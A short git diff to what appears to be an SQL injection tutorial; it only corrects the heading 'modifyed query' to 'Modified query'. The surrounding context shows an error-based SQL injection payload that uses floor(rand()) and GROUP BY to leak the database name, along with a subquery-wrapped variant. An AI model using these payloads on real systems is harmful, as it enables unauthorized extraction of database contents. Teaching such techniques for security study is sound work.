@@ -91,7 +91,7 @@ A subquery is usually added within the WHERE Clause of another SQL SELECT statem
 
 `select count(*), concat("::",database(),"::",floor(rand()*2))a from information_schema.columns group by a;`
 
-#### modifyed query
+#### Modified query
 `select(select 1 from (select count(*), concat("::",database(),"::",floor(rand()*2))a from information_schema.columns group by a)b);`
 
 
